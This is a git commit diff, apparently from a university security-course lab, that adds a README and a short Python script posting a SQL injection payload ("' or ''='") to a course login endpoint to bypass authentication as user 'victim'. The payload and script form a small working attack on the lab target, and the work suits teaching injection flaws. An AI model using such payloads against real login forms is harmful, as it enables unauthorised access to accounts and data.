d4d66787acf10d908d9101a5c69b4464795a1b3d
mikebrownie <54919721+mikebrownie@users.noreply.github.com>
2021-03-03 11:58:50 -0800

    Adding sql injections + xss with no defenses

---
+++ README.md
@@ -0,0 +1,7 @@
+# SQL Injections and XSS Cross Site Scripting.
+
+## Files Included
+
+- sql_0.txt
+
+- sql_1.txt
--- main.py
+++ main.py
@@ -1,17 +1,19 @@
-# This is a sample Python script.
+from urllib.parse import urlencode
 
-# Press Shift+F10 to execute it or replace it with your code.
-# Press Double Shift to search everywhere for classes, files, tool windows, actions, and settings.
-
+import requests
+import urllib
 
 def create_login(user, password):
-    https://project2.ecen4133.org/
-    # Use a breakpoint in the code line below to debug your script.
-    print(f'Hi, {name}')  # Press Ctrl+F8 to toggle the breakpoint.
+    url = "https://project2.ecen4133.org/sqlinject/0"
+    query = {
+        'user': user,
+        'password': password,
+    }
 
+    res = requests.post(url, data=query)
+    print(res.text)
 
-# Press the green button in the gutter to run the script.
 if __name__ == '__main__':
-    print_hi('PyCharm')
+    create_login('victim', urlencode("' or ''='"))
 
-# See PyCharm help at https://www.jetbrains.com/help/pycharm/
+
